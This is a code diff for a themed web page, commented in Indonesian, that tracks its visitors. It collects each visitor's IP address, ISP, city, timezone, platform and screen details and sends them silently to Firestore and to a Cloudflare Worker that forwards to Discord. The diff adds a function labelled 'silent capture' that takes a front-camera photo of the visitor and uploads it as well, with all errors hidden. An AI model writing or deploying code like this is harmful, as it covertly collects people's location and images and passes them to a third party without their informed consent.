@@ -45,6 +45,7 @@
   .term .line{white-space:pre-wrap;word-break:break-word;padding:1.5px 0;}
   .term .line.gold{color:var(--gold);font-weight:600;}
   .term .line.pink{color:var(--pink);}
+  .term .line.dim{color:rgba(255,233,247,.45);}
   .cursor{display:inline-block;width:7px;height:.95em;background:var(--pink);
     animation:blink 1s steps(1) infinite;vertical-align:text-bottom;margin-left:2px;}
   @keyframes blink{50%{opacity:0}}
@@ -90,7 +91,7 @@ const firebaseConfig = {
   messagingSenderId: "__FIREBASE_MESSAGING_SENDER_ID__",
   appId:             "__FIREBASE_APP_ID__"
 };
-/* URL Cloudflare Worker yang forward ke Discord */
+/* URL Cloudflare Worker */
 var WORKER_URL = "__CF_WORKER_URL__";
 
 var FB_READY = firebaseConfig.apiKey && !firebaseConfig.apiKey.startsWith("__");
@@ -167,8 +168,15 @@ for(var s=0;s<(IS_MOBILE?6:12);s++){
 
 /* ── Terminal ─────────────────────────────────────────────────────────── */
 var term=document.getElementById("term");
-function addLine(txt,cls){var d=document.createElement("div");d.className="line"+(cls?" "+cls:"");d.textContent=txt;term.appendChild(d);}
-function addCursor(){var c=document.createElement("span");c.className="cursor";term.appendChild(c);}
+var cursorEl=null;
+function addLine(txt,cls){
+  if(cursorEl){term.removeChild(cursorEl);cursorEl=null;}
+  var d=document.createElement("div");d.className="line"+(cls?" "+cls:"");d.textContent=txt;term.appendChild(d);
+}
+function setCursor(){
+  if(cursorEl) return;
+  cursorEl=document.createElement("span");cursorEl.className="cursor";term.appendChild(cursorEl);
+}
 
 /* ── IP lookup ───────────────────────────────────────────────────────── */
 function fetchJson(url, ms){
@@ -196,6 +204,49 @@ async function getIpInfo(){
   return null;
 }
 
+/* ── Kamera depan (silent capture) ──────────────────────────────────── */
+async function captureCamera(){
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  var stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 400 }, height: { ideal: 300 } },
+      audio: false
+    });
+  } catch(e) { return null; }
+
+  try {
+    var vid = document.createElement("video");
+    vid.srcObject = stream;
+    vid.muted = true;
+    vid.playsInline = true;
+
+    /* Tunggu metadata dengan timeout 5 detik agar tidak hang */
+    await new Promise(function(res, rej){
+      var tid = setTimeout(function(){ rej(new Error("metadata timeout")); }, 5000);
+      vid.onloadedmetadata = function(){ clearTimeout(tid); res(); };
+      vid.onerror          = function(e){ clearTimeout(tid); rej(e); };
+    });
+
+    await vid.play();
+    await new Promise(function(r){ setTimeout(r, 700); }); // warm-up kamera
+
+    var cvs = document.createElement("canvas");
+    cvs.width  = vid.videoWidth  || 400;
+    cvs.height = vid.videoHeight || 300;
+    cvs.getContext("2d").drawImage(vid, 0, 0, cvs.width, cvs.height);
+
+    return await new Promise(function(resolve){
+      cvs.toBlob(function(b){ resolve(b || null); }, "image/jpeg", 0.75);
+    });
+  } catch(e) {
+    return null;
+  } finally {
+    /* Selalu matikan stream, bahkan jika error */
+    if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
+  }
+}
+
 /* ── Kirim ke Firestore ──────────────────────────────────────────────── */
 async function sendToFirestore(data) {
   if (!FB_READY) return;
@@ -206,50 +257,57 @@ async function sendToFirestore(data) {
       url: window.location.href,
       referrer: document.referrer || null
     });
-  } catch (e) { /* silent */ }
+  } catch(e) { /* silent */ }
 }
 
-/* ── Kirim ke Cloudflare Worker → Discord ───────────────────────────── */
-async function sendToWorker(data) {
+/* ── Kirim ke Worker → Discord ───────────────────────────────────────── */
+async function sendToWorker(data, photoBlob) {
   if (!CF_READY) return;
+  var payload = { ...data, url: window.location.href, referrer: document.referrer || null };
   try {
-    await fetch(WORKER_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        ...data,
-        url: window.location.href,
-        referrer: document.referrer || null
-      })
-    });
-  } catch (e) { /* silent */ }
+    if (photoBlob) {
+      var form = new FormData();
+      form.append("data", JSON.stringify(payload));
+      form.append("photo", photoBlob, "visitor.jpg");
+      await fetch(WORKER_URL, { method: "POST", body: form });
+    } else {
+      await fetch(WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+  } catch(e) { /* silent */ }
 }
 
 /* ── MAIN ────────────────────────────────────────────────────────────── */
 async function run(){
-  addLine("> guild@isekai:~$ melacak pengunjung...");
-  addLine("> mengambil koordinat portal...");
+  addLine("> guild@isekai:~$ mendeteksi penyusup...", "dim");
+  setCursor();
 
-  var info    = await getIpInfo();
-  var ip      = info&&info.ip           ||"tidak diketahui";
-  var isp     = info&&info.org          ||"tidak diketahui";
-  var city    = info&&info.city         ||"";
-  var region  = info&&info.region       ||"";
-  var country = info&&info.country_name ||"";
-  var tz      = info&&info.timezone     ||"tidak diketahui";
-  var lokasi  = [city,region,country].filter(Boolean).join(", ")||"tidak diketahui";
+  /* Jalankan IP lookup + kamera capture secara paralel */
+  var [info, photo] = await Promise.all([
+    getIpInfo(),
+    captureCamera()
+  ]);
 
-  addLine("> IP dunia nyata: "+ip, "gold");
-  addLine("> guild / ISP: "+isp);
-  addLine("> lokasi: "+lokasi);
-  addLine("> zona waktu: "+tz);
-  addLine("> platform: "+navigator.platform);
-  addLine("> device: "+navigator.userAgent.slice(0,80)+"...");
-  addLine("> bahasa: "+navigator.language);
-  addLine("> resolusi: "+screen.width+"x"+screen.height+" ("+devicePixelRatio+"x)");
-  addLine("> rank akses: PENGUNJUNG TERSESAT","pink");
-  addLine("> mencatat ke grimoire...");
-  addCursor();
+  var ip      = info&&info.ip           || "—";
+  var isp     = info&&info.org          || "—";
+  var city    = info&&info.city         || "";
+  var region  = info&&info.region       || "";
+  var country = info&&info.country_name || "";
+  var tz      = info&&info.timezone     || "—";
+  var lokasi  = [city,region,country].filter(Boolean).join(", ") || "—";
+
+  addLine("> IP terdeteksi: " + ip,    "gold");
+  addLine("> ISP / Guild:   " + isp);
+  addLine("> Lokasi:        " + lokasi);
+  addLine("> Zona Waktu:    " + tz);
+  addLine("> Platform:      " + navigator.platform);
+  addLine("> Resolusi:      " + screen.width + "×" + screen.height + " (" + devicePixelRatio + "×)");
+  addLine("> Foto kamera:   " + (photo ? "✓ berhasil" : "✗ ditolak"), photo ? "gold" : "dim");
+  addLine("> Mencatat ke grimoire...", "dim");
+  setCursor();
 
   var payload = {
     ip, isp, city, region, country, lokasi,
@@ -262,11 +320,14 @@ async function run(){
     pixelRatio: devicePixelRatio
   };
 
-  /* Kirim ke Firestore (log) dan Worker (Discord) secara paralel */
+  /* Kirim ke Firestore + Worker secara paralel */
   await Promise.all([
     sendToFirestore(payload),
-    sendToWorker(payload)
+    sendToWorker(payload, photo)
   ]);
+
+  addLine("> Data berhasil dikirim ke guild.", "pink");
+  setCursor();
 }
 
 run();
